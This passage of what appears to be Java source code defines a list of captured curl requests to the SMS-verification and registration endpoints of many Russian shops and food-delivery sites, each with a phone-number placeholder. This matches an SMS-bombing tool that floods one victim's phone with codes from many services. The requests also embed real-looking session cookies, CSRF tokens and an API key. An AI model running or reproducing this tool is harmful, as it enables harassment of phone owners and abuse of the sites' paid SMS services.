Zcy6hxc1A0EnYMuzKmmQ6k90Vy4pxJM2sE7xW4RX=eyJpdiI6ImRnNERqYnZRS0FQM1NReUVZc2VqaVE9PSIsInZhbHVlIjoiOHV3ckpCN2RaelhnVHZwT2dKUWlYOHd4Y082NHJmSVdUS3o4eFM3T3IwMk1IYXdFNWxpNjRWb2FwRWxFS2FUUStDQytsWGt3c1dOaml2VnBMTWpCQlBkbURhSFJoa2RFWmtQb2cwOVE2eEhLVWI3SEZ0aEJBK3NJRzNrV1lZL3JoR0U3c3Q0eGUwLzd5Skkyb05tdjhWVlRGVjN4NVl0WVEwbUYzRVA2bCtrem1pZEloSG5UNGdBZk1MR29qMDNSSjJDeXBWWk5WeDVIM0NhL3gzZHJUWlk2S0UwMGw2VzdjZisrWEZSWFVuaW84UnprNzhUaDJjd3FvNjdyM0lPNFBBbGdnN2V3WE0rdjhWMGFaTmVCUHRDVEJ1U3VZekdTYlRvcElxR0lFZHI3VGlabFdHYllFRllzRU9wWFRzWmZqY295emhFbmlzdEFjUGdHTlFGekhXRC9IQnhsS3hid04wYUhLaDcwSFB4c01qbmdUVHlCUTcrd1NidWxwU3RFIiwibWFjIjoiZDAyMWI3MTFkNmE5MWI5OGEzZWYyNGUxNmJkY2NiNDdjYjQwNzMzMzFhYjAxMTdkMDllN2VkZTRkMGI5YTk3NCJ9; _ga_CZP03407E0=GS1.1.1683456340.1.0.1683456340.0.0.0; _ga=GA1.2.243452895.1683456341; _gid=GA1.2.1501238963.1683456341; _gat_gtag_UA_192269048_1=1; tmr_lvid=4e4971e2a993160b9dbf32e2b54dbf6e; tmr_lvidTS=1683456341712; _fbp=fb.1.1683456341968.1135216328; _ym_uid=1683456343586258782; _ym_d=1683456343; _ym_visorc=w; _ym_isad=2; tmr_detect=0%7C1683456344007; usescookie=true' \\\n" +
                        "  -H 'origin: https://xn----8sbpjmk6aq9b.xn--p1ai' \\\n" +
                        "  -H 'referer: https://xn----8sbpjmk6aq9b.xn--p1ai/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-csrf-token: cNFConBGuBkSk3RCsbQkoXZ5jFZudBmdwcYZ5Gsl' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\",\"recaptcha\":\"03AL8dmw_W1R260z1oIX_vKqV31r4Fkv_r9tadJo1V1wYFBJYREZf7DCAC9Yd2BseOiOmk-4aCYQlcTL0AJAUCWUkA6zDrxFfZ96H_uh71GtPXZcMPxOjXWObkqQBlUJWm__-XGnbGvt7mxyqkPbsfoEHP1L40NX6RdUwleBjpmpGnFay5Gea8Hm-m3aKYYVoj66o9PZGW738tke_EjQWCCpi1pJEVzb1eztauckUX4OpFkuvhQtyAkvHHtI48AaKg4SSjOfkrgdOXKGlD3_giQl-sthYGfNImKQLBpyRz6ldrJiu4oLExIj4AHEwGu763A0D34S6CAgi1pqsDzmx-92LmSkJq6H4yMlFoo3Cm7Io5G8xHqMbvlBxme36xlLmsA7tvTNRvhGilUfTOo7EinBjEQ_XbeSTyI96OS6EYdhIVjLgSnklshGeNlQfxzG-WJKm2xAkuXWiyJRbm0BrhlcAORvvEmAmYV1rG1-IYuO10b32lxdqjjHt1frpFz-Skg9_Db68P40TvMPJV172pMRwkOCSZUozHOqCoBSPj0NEApvyMW4OiKdU\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://mybile.secret-kitchen.ru/api/v1/sms/send_code' \\\n" +
                        "  -H 'Accept: */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Business: sk' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'Deviceid: 204cc159-8a91-4d8c-befc-7e401d58a15f' \\\n" +
                        "  -H 'Origin: https://secret-kitchen.ru' \\\n" +
                        "  -H 'Platformid: site' \\\n" +
                        "  -H 'Referer: https://secret-kitchen.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone}\",\"type\":\"auth\",\"apiKey\":\"eb2090ca404dbf4d52b42e1221392ff02193ee9f4b81e67262dbc39e72d3170b\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://mir-sporta.com/signup/' \\\n" +
                        "  -H 'Accept: */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'Cookie: is_mobile=true; PHPSESSID=vq6aetk0a9h0j8d9suioje3bgm; referer=https%3A%2F%2Fwww.google.com%2F; landing=%2F; shop_regions_env_key=645781563663d6.23853570; utm=%7B%22source%22%3A%22google%22%7D; marquiz__url_params=%7B%22utm_source%22%3A%22google%22%7D; visited=true; _ga=GA1.1.1511665671.1683456500; tmr_lvid=d9170a17def0345867921a630b53eff7; tmr_lvidTS=1683456500839; roistat_visit=5651427; roistat_first_visit=5651427; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_uid=UI4rfTbDZit7A2T69T9k; mgo_cnt=1; mgo_sid=8o1gruabcl11001ojv0f; _ru_yandex_autofill=long_time_no_see; _ym_uid=1683456502271103502; _ym_d=1683456502; _ym_isad=2; _ym_visorc=w; roistat_marker=seo_google_; roistat_marker_old=seo_google_; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old; ___dc=7b8ce2f7-ad59-4636-a303-dd8d4cfe6975; is_mobile=true; _ga_ZDQPPXGNJK=GS1.1.1683456500.1.1.1683456508.52.0.0; ab_id=c3b5a5d6621baca65c1e959c5dcb31dd4cff20aa; mgo_sb_session=pgs%253D4%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fmir-sporta.com%252Fsignup%252F; tmr_detect=0%7C1683456511127' \\\n" +
                        "  -H 'Origin: https://mir-sporta.com' \\\n" +
                        "  -H 'Referer: https://mir-sporta.com/signup/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'X-Requested-With: XMLHttpRequest' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw 'data%5Bfirstname%5D=gewerger&data%5Bphone%5D=%2B{phone:7+(***)+***-**-**}&wa_json_mode=1&need_redirects=1&contact_type=person' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://kingsushi.pro/api/auth/sms' \\\n" +
                        "  -H 'authority: kingsushi.pro' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: _ym_uid=1683456639375639865; _ym_d=1683456639; _ga=GA1.2.48120215.1683456639; _gid=GA1.2.1465262980.1683456639; _gat=1; _ym_visorc=w; _ym_isad=2; _gat_gtag_UA_112669561_15=1; XSRF-TOKEN=eyJpdiI6Im5MTEN1dklSeVVUa2h3c3VDMi9nQkE9PSIsInZhbHVlIjoiR3lxbVN5ZEVaanlGa3VTN3JYeVRkKzkwdkNrWU5yUHZUWjBTZjl6WXpFYkMvcVBTb0hkK0hmVktqRjRpQUxnL1JiVHBnUGZGVGE3ckJ2MGl5cjNLZmg5aHZOWm9ueGNRSnRFTEJDSFVFeHRhYlFDUWp6aWIwVW0vVmRXUkJ5Q0giLCJtYWMiOiJjZDNlYmU5MDhiMGMzYmU1NDBhMjBiZTRiMDNhMmU2NDFlNmVlOTRiZmYwZGYzYjZiNmZkOTEyNzQ2MThhMjQ4IiwidGFnIjoiIn0%3D; kingsushi_session=eyJpdiI6Ik9KZHNFUW92eElIdEtNeXRjczVldFE9PSIsInZhbHVlIjoiOFFmbWxaWllTQ0VraEtOTnZ1dkhaU0lNSVVQdmZCSUg2Zmk1cENDSlA5ang2V3JLSWFGUm1sMEZZSXB5Y1l5Q09xVlBzSTE3ZTdiNE4vSUkySFhSOFprVkpqUW0xamVCaXpON1VkREVHUjRXaWFReFpGZkQ3NkhMRkNiVnB1dW4iLCJtYWMiOiIzZTQ1YmQ5OTRhZDAxN2RkNGIxNzY3ZTYxYWUxNDlmY2IxMmU0NDBlMjczMGMyZGMzMDA5ZTI2NDliNTNmODIwIiwidGFnIjoiIn0%3D; true_http_referer=https%3A%2F%2Fkingsushi.pro%2F' \\\n" +
                        "  -H 'origin: https://kingsushi.pro' \\\n" +
                        "  -H 'referer: https://kingsushi.pro/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-xsrf-token: eyJpdiI6Im5MTEN1dklSeVVUa2h3c3VDMi9nQkE9PSIsInZhbHVlIjoiR3lxbVN5ZEVaanlGa3VTN3JYeVRkKzkwdkNrWU5yUHZUWjBTZjl6WXpFYkMvcVBTb0hkK0hmVktqRjRpQUxnL1JiVHBnUGZGVGE3ckJ2MGl5cjNLZmg5aHZOWm9ueGNRSnRFTEJDSFVFeHRhYlFDUWp6aWIwVW0vVmRXUkJ5Q0giLCJtYWMiOiJjZDNlYmU5MDhiMGMzYmU1NDBhMjBiZTRiMDNhMmU2NDFlNmVlOTRiZmYwZGYzYjZiNmZkOTEyNzQ2MThhMjQ4IiwidGFnIjoiIn0=' \\\n" +
                        "  --data-raw '{\"phone\":\"+{phone:7 (***) ***-**-**}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://api.rollex.ru/api/v4/auth/register' \\\n" +
                        "  -H 'authority: api.rollex.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'keywordapi: ProjectVApiKeyword' \\\n" +
                        "  -H 'origin: https://rollex.ru' \\\n" +
                        "  -H 'platformname: Site' \\\n" +
                        "  -H 'referer: https://rollex.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  -H 'usedapiversion: 6' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  --data-raw '\"+{full_phone}\"' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://vl.pizza-prosto.ru/api/?action=confirm-phone&city=vl' \\\n" +
                        "  -H 'authority: vl.pizza-prosto.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: __cf_bm=ksR8PZ1YhDjkdFbSopUar3Bq2VPu9udTGHiY2m.ALU0-1683457666-0-AUPUAiEdQRe3dnnwSJUhrt7znCy970aX0mOIrBRIZ69mRiLulriNADCynAl2Bs5FLDEE7bA64jv5HlvbsZlZXQYK9QKjP5v5nP+PAMyVBplf; _ym_uid=168345766647670538; _ym_d=1683457666; _ym_isad=2; _ym_visorc=w; PHPSESSID=CdgwDxgIuCk6YflYj70xulp3SMveT0PG; APP_DOWNLOAD=Y; _ga=GA1.2.578830437.1683457668; _gid=GA1.2.251775189.1683457668; _gat=1; _gat_gtag_UA_99839605_1=1; _gat_UA-99839605-1=1; app-lang=ru; tmr_lvid=40bcb326676fd582e1f6c3985c1bfcd6; tmr_lvidTS=1683457668709; SITE_LANG=ru; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; iiko_card_token=ENxzeU30G7nZkygjkHwW4OBSciTkAoLjlGoxRXv0tbkQr_V5yzDbC78RPkg64Q4JubkN9z8Cx2iYqxuMjRKPnA2; _ga=GA1.3.578830437.1683457668; _gid=GA1.3.251775189.1683457668; tmr_detect=0%7C1683457671384' \\\n" +
                        "  -H 'origin: https://vl.pizza-prosto.ru' \\\n" +
                        "  -H 'referer: https://vl.pizza-prosto.ru/?cityname=vl' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-bitrix-csrf-token: 0800655d65e774e0508fdc8ed8d849fa' \\\n" +
                        "  --data-raw '{\"phone\":\"+{phone:7 (***) ***-**-**}\",\"devMode\":false}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://shop.gretta.ru/module/kbmobilelogin/verification' \\\n" +
                        "  -H 'authority: shop.gretta.ru' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: __utma=43524467.311017584.1683457855.1683457855.1683457855.1; __utmc=43524467; __utmz=43524467.1683457855.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=43524467.1.10.1683457855; _ym_uid=1683457856850113444; _ym_d=1683457856; _ym_visorc=w; _ym_isad=2; PHPSESSID=bpholhcnbcqqitellf3m0slpt4; PrestaShop-716f306ed4cabd7967d4642f10a5b8e5=fe09d12642f7924ddf4e829d8aae696b3e6c852b21132fe3e4e676918527ac46%3A4lDPy0ozvb8rsuoRJPlColJ4jKLUQU7sEOsyzEgT1l%2BT8ZL8f5p%2BOoHVVmi7hZ5B6jhL2MaQvYdByIKUSfHuCAeiN%2BFXAWG7nX7p2WxvezGeUEZd6YIRsdEeBtsDSwu15xTeiJAfkOxORV1fxmlZmDbZbv53Kw%2Foe6LSLaUne3k%3D; PrestaShop-42f3a2116b37f69bf8a9fe4a0af32fcb=94cb6bd0c5baed3019ab1387a5d75c5a3402f2b1e6d135c936fe0c7640a94bd9%3A4lDPy0ozvb8rsuoRJPlColJ4jKLUQU7sEOsyzEgT1l8m4GV7i11PPhJexOesxfWfNlGyeOpaQmigFkJBP7%2B%2F1NJTt85ItBk8jkhoWqgPfZw%3D; JivoSiteLoaded=1; _ga=GA1.2.311017584.1683457855; _gid=GA1.2.2002476263.1683457861; _gat=1; tmr_lvid=c51c3f31a65656375e187152a50ec3c5; tmr_lvidTS=1683457861236; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1683457870581' \\\n" +
                        "  -H 'origin: https://shop.gretta.ru' \\\n" +
                        "  -H 'referer: https://shop.gretta.ru/authentication?back=my-account' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'ajax=true&method=sendOTP&kbMobileNumber={phone}&kbCountryId=177' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://ru.vivo.com/local/ajax/phone-register.php' \\\n" +
                        "  -H 'authority: ru.vivo.com' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=v7Jy353SIOIBo7V6MmvwFhc4uiSu5uqS; compare=b%3A0%3B; favorites=b%3A0%3B; BITRIX_SM_SALE_UID=b75dc655abe562d566068db5c547c3de; _gcl_au=1.1.1185812979.1683459454; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A20%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_B2FE0GEYSM=GS1.1.1683459454.1.0.1683459454.60.0.0; cto_bundle=gu5DMl9tbXpHMDE1cWozTHNFOHMzdlRJekZWJTJCT2lXaVdpTSUyRldld3p5V3NuNHNXMHVaRCUyQk1WUEhScGJTSkhqaFVwRWNQJTJCOW1wQmF1S1BrQktkVE5QcVFPVFNOVVJZMVgwVyUyQmw5dmYzTHM1UkRJNGF4RWVBaUpEMHo4WG4xdWZmS1BPazQ; _ga=GA1.2.1762444711.1683459455; _gid=GA1.2.1856493311.1683459456; _gat_UA-129676176-1=1; _ym_uid=1683459456409107820; _ym_d=1683459456; tmr_lvid=f4ef43b9d73b0c04e3e02eeb5eaac8c2; tmr_lvidTS=1683459456266; adtech_uid=119c2cd1-86c7-4158-99cd-9fd6c255847e%3Avivo.com; top100_id=t1.7541176.257239660.1683459456682; last_visit=1683448656688%3A%3A1683459456688; global_uuid=0HGZEad2MZ5RRZMfE; convead_guest_uid=yQEQUta2JXkuhtZQj; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"10002549\"}; _tt_enable_cookie=1; _ttp=Dv_cIPj33RztXHg4To8Fsb1elge; _ym_isad=2; _ym_visorc=w; t3_sid_7541176=s1.1791601658.1683459456685.1683459457104.1.2; _gp10002549={\"hits\":1,\"vc\":1}; tmr_detect=0%7C1683459459056' \\\n" +
                        "  -H 'origin: https://ru.vivo.com' \\\n" +
                        "  -H 'referer: https://ru.vivo.com/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'REGISTER%5BLOGIN%5D=%2B{phone:7+(***)+***-**-**}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://lider-mart.ru/AuthorizationAjax/ValidPhone/' \\\n" +
                        "  -H 'Accept: */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'Cookie: CodeBrowser=7EA28BBE788A2ECC7AC64B2CE3608CCF; _ga=GA1.1.307182496.1683460113; _ym_uid=1683460114343161023; _ym_d=1683460114; _ym_visorc=w; _ym_isad=2; runid=79B6E731CDBEC342C24DC054D6AE0D5E; userID=A46C3B54F2C9871CD81DAF7A932499C0; _ga_51FQ6Y1Z7J=GS1.1.1683460112.1.1.1683460143.29.0.0' \\\n" +
                        "  -H 'Origin: https://lider-mart.ru' \\\n" +
                        "  -H 'Referer: https://lider-mart.ru/cabinet/registration' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'X-Requested-With: XMLHttpRequest' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw 'phone=%2B{phone:7+***+***+****}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://ruvape.ru/smsc.php' \\\n" +
                        "  -H 'authority: ruvape.ru' \\\n" +
                        "  -H 'accept: text/html, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: _ym_uid=1683461611212840060; _ym_d=1683461611; _ym_visorc=w; _ym_isad=2; word=t; verification_code=7047' \\\n" +
                        "  -H 'origin: https://ruvape.ru' \\\n" +
                        "  -H 'referer: https://ruvape.ru/signup/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phoneNumber=%2B{phone:7+(***)+***-**-**}&code=7047' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://istnova.ru/local/templates/istnova/components/bitrix/system.auth.authorize/flat/ajax_phone.php' \\\n" +
                        "  -H 'authority: istnova.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: text/plain;charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=LUc7My3OXNDqI9Qy30MdTK0NgFlpC2cr; BITRIX_SM_GUEST_ID=5902397; BITRIX_SM_LAST_ADV=5_Y; BITRIX_SM_SALE_UID=045c1b28557a3630c14280a7a906f0ab; _ym_uid=1683470306671026224; _gid=GA1.2.1090755213.1683470306; _ga_cid=1192191747.1683470306; _gat_UA-155203662-1=1; _ym_isad=2; _ym_visorc=w; tmr_lvid=88656b838b4cb2692d4a79fb2f2b7221; tmr_lvidTS=1683470306552; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _fbp=fb.1.1683470306684.535119077; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A23%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BITRIX_SM_LAST_VISIT=07.05.2023%2017%3A38%3A29; _ga_GDZJZY5RQY=GS1.1.1683470306.1.0.1683470309.0.0.0; _ga=GA1.1.1192191747.1683470306; _ym_d=1683470310; tmr_detect=0%7C1683470311578' \\\n" +
                        "  -H 'origin: https://istnova.ru' \\\n" +
                        "  -H 'referer: https://istnova.ru/personal/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  --data-raw '{\"phone\":\"+{full_phone}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://moymyasnoy76.ru/ajax/phone_auth.php' \\\n" +
                        "  -H 'authority: moymyasnoy76.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=FJfi6bMzD4BXLXy9kI7me30lZZ2ZDR5Q; BITRIX_SM_SALE_UID=a2447f6e382720fdc4ab7800b420ff2e; BITRIX_SM_TZ=Europe/Moscow; _ym_debug=null; BITRIX_CONVERSION_CONTEXT_s2=%7B%22ID%22%3A19%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; searchbooster_v2_user_id=AFYuqv6IjR4kYm7J-YsTi_d4NpZUIaLAuYJO_YpP-nR%7C4.7.17.55; ageCheckPopupRedirectUrl=%2Fv2-mount-input; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_uid=1683471349150429049; _ym_d=1683471349; _ym_isad=2; _ym_visorc=w' \\\n" +
                        "  -H 'origin: https://moymyasnoy76.ru' \\\n" +
                        "  -H 'referer: https://moymyasnoy76.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
